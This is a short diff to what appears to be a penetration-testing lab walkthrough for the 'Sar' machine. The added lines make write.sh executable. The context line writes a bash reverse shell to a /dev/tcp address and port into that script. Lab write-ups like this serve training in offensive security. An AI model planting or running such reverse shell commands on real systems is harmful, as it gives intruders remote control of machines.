@@ -240,3 +240,8 @@ Overwrite the contents of write.sh
 www-data@sar:/var/www/html$ echo "bash -i >& /dev/tcp/192.168.45.231/9999 0>&1" > write.sh
 ```
 ![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/3c68e5f7-0b2f-44fa-94fa-ab033bbfd3da)
+
+```
+www-data@sar:/var/www/html$ chmod +x write.sh
+chmod +x write.sh
+```
